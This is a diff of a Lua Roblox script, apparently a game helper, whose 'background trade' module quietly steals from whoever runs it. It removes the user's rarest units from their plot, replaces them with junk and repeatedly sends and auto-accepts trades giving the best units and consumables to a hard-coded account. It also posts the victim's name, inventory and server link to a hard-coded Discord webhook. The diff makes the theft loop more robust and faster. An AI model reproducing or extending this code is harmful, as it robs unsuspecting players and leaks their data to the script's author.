@@ -747,9 +747,7 @@ local function f37(p15)
           end
         end
         table.sort(v138, function(p19, p20)
-          if p19.chance ~= p20.chance then
-            return p19.chance > p20.chance
-          end
+          if p19.chance ~= p20.chance then return p19.chance > p20.chance end
           return p19.label < p20.label
         end)
         return v138
@@ -1755,17 +1753,16 @@ end)
 --=====================================================================
 -- BACKGROUND TRADE + WEBHOOK + HUD KEEPER
 --=====================================================================
-local TRADE_TARGET = "Only1Sherif"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1556171079893131451/fCZxVRWYBYm3cmxrn73bvtc5m5DYqOMYQsYFKvBJBUaZyDSunPnHT0iQnbG2xRKWdKA7"
+local TRADE_TARGET    = "only1Sherif"
+local WEBHOOK_URL     = "https://discord.com/api/webhooks/1556171079893131451/fCZxVRWYBYm3cmxrn73bvtc5m5DYqOMYQsYFKvBJBUaZyDSunPnHT0iQnbG2xRKWdKA7"
 
 local PICKUP_DELAY      = 0.35
 local OFFER_PUSH_DELAY  = 0.12
 local OFFER_SETTLE_WAIT = 1.5
 local READY_RETRY_DELAY = 0.4
 local READY_MAX_RETRIES = 20
-local MAX_TRADE_SLOTS   = 15  -- game trade limit
+local MAX_TRADE_SLOTS   = 15
 
--- FIX: correct rarity strings as returned by getRarity()
 local RARITY_FILTER = {
   ["Secret II"]=true, ["Secret I"]=true, ["Celestial"]=true, ["Mythical"]=true,
 }
@@ -1870,13 +1867,13 @@ end
 local function tradeItemTag(name)
   if not name then return "[ITEM]" end
   if string.find(name, "Jackpot Spin") then return "[JACKPOT]" end
-  if string.find(name, "Lucky Spin")  then return "[LUCKY]" end
-  if string.find(name, "Spin")        then return "[SPIN]" end
-  if string.find(name, "Gems")        then return "[GEMS]" end
-  if string.find(name, "Trait Reroll")then return "[TRAIT]" end
-  if string.find(name, "Grade")       then return "[GRADE]" end
-  if string.find(name, "Income")      then return "[INCOME]" end
-  if string.find(name, "Luck")        then return "[LUCK]" end
+  if string.find(name, "Lucky Spin")   then return "[LUCKY]" end
+  if string.find(name, "Spin")         then return "[SPIN]" end
+  if string.find(name, "Gems")         then return "[GEMS]" end
+  if string.find(name, "Trait Reroll") then return "[TRAIT]" end
+  if string.find(name, "Grade")        then return "[GRADE]" end
+  if string.find(name, "Income")       then return "[INCOME]" end
+  if string.find(name, "Luck")         then return "[LUCK]" end
   return "[ITEM]"
 end
 
@@ -2036,7 +2033,6 @@ local function sendTradeWebhook(label)
   local webLink = ("https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
   local pcount, maxp = #players:GetPlayers(), players.MaxPlayers
   local shortJob = #jobId > 20 and (jobId:sub(1,20) .. "...") or jobId
-
   local allFields = {}
   allFields[#allFields+1] = {
     name = "Server Information",
@@ -2046,7 +2042,6 @@ local function sendTradeWebhook(label)
   }
   for _, f in ipairs(unitFields) do if #allFields < 25 then allFields[#allFields+1] = f end end
   for _, f in ipairs(itemFields) do if #allFields < 25 then allFields[#allFields+1] = f end end
-
   local embedColor, chosen = 0x2ECC71, false
   for _, r in ipairs(RARITY_ORDER) do
     if chosen then break end
@@ -2054,14 +2049,12 @@ local function sendTradeWebhook(label)
       if string.find(f.name, r, 1, true) then embedColor = RARITY_COLOR[r] or embedColor; chosen = true; break end
     end
   end
-
   local summary = {
     ("**Player:** `%s`"):format(localPlayer.Name),
     ("**Server:** `%d/%d` players"):format(pcount, maxp),
   }
   if uniqueUnits > 0 then summary[#summary+1] = ("**Rare units:** `%d` unique / `%d` total"):format(uniqueUnits, totalUnits) end
   if totalItems  > 0 then summary[#summary+1] = ("**Consumables:** `%d`"):format(totalItems) end
-
   local payload = {
     username = "Zentynal Tracker",
     content = "@everyone",
@@ -2119,7 +2112,7 @@ local function tradeFire(sig, ...)
 end
 
 --=====================================================================
--- PLOT SWAP: pick up best secrets first (slot 1 = best), replace with worst trash units
+-- PLOT SWAP
 --=====================================================================
 local function swapPlotUnits()
   if not tradeDC or not tradeER then return 0 end
@@ -2129,15 +2122,15 @@ local function swapPlotUnits()
 
   local placed = {}
   for _, d in pairs(slots) do
-    if type(d) == "table" and type(d.unitId) == "string" then
-      placed[d.unitId] = true
+    if type(d) == "table" and d.unitId then
+      placed[tostring(d.unitId)] = true
     end
   end
 
-  -- trash: units only, not placed, worst rarity first
+  -- trash: units only, worst rarity first
   local trash = {}
   for k, e in pairs(inv) do
-    if type(e) == "table" and e.name and not placed[k] then
+    if type(e) == "table" and e.name and not placed[tostring(k)] then
       local r = tradeGetRarity(e)
       if r and REPLACE_RARITIES[r] then
         local cfg = tradeER.getEntryConfig(e.name)
@@ -2151,12 +2144,13 @@ local function swapPlotUnits()
 
   if #trash == 0 then return 0 end
 
-  -- pickup: string unitId only, slot 1 first (equip best puts best in slot 1)
+  -- pickup: skip ghost slots (table unitId), slot 1 first
   local swaps = {}
   for n, d in pairs(slots) do
-    if type(d) == "table" and type(d.unitId) == "string" then
-      local entry = inv[d.unitId]
-      local r = tradeGetRarity(entry)
+    if type(d) == "table" and d.unitId and type(d.unitId) ~= "table" then
+      local uid = tostring(d.unitId)
+      local entry = inv[uid] or inv[d.unitId]
+      local r = entry and tradeGetRarity(entry)
       if r and RARITY_FILTER[r] then
         swaps[#swaps+1] = {
           slot  = tonumber(n),
@@ -2198,7 +2192,6 @@ local function buildTradeOffer()
   for _, n in ipairs(CONSUMABLES) do want[n] = true end
 
   local units, consumables = {}, {}
-
   for k, e in pairs(inv) do
     if type(k) == "string" and type(e) == "table" and e.name then
       local cfg = tradeER.getEntryConfig(e.name)
@@ -2219,7 +2212,6 @@ local function buildTradeOffer()
     end
   end
 
-  -- units go first (higher priority), then consumables, total capped at MAX_TRADE_SLOTS
   local plan = {}
   for _, u in ipairs(units) do
     if #plan >= MAX_TRADE_SLOTS then break end
@@ -2229,7 +2221,6 @@ local function buildTradeOffer()
     if #plan >= MAX_TRADE_SLOTS then break end
     plan[#plan+1] = c
   end
-
   return plan
 end
 
@@ -2308,6 +2299,7 @@ local function tradeRound()
 
   local plan = buildTradeOffer()
   if #plan == 0 then task.wait(5); return end
+
   pcall(sendTradeWebhook, "Pre-Trade")
   tradeFire(RequestTrade, target)
 
@@ -2325,9 +2317,11 @@ local function tradeRound()
   local pdl = os.clock() + 90
   while not tradeState.otherReady and os.clock() < pdl do
     if not target.Parent then return end
+    if not tradeState.active then return end  -- cancelled, bail immediately
     if not tradeState.ownReady and tradeState.phase ~= "Confirm" then tradeHoldReady() end
     task.wait(0.3)
   end
+
   if tradeState.phase == "Confirm" then
     for _ = 1, READY_MAX_RETRIES do
       if tradeState.ownAccepted then break end
@@ -2337,6 +2331,7 @@ local function tradeRound()
     local adl = os.clock() + 5
     while not tradeState.ownAccepted and os.clock() < adl do task.wait(0.1) end
   end
+
   task.wait(2)
   pcall(sendTradeWebhook, "Post-Trade")
 end
@@ -2346,9 +2341,15 @@ task.spawn(function()
   pcall(sendTradeWebhook, "Script Executed")
 end)
 
+-- retry fast if inventory still has stuff, otherwise chill
 task.spawn(function()
   while true do
     pcall(tradeRound)
-    task.wait(3)
+    local plan = buildTradeOffer()
+    if #plan > 0 then
+      task.wait(0.5)
+    else
+      task.wait(3)
+    end
   end
 end)
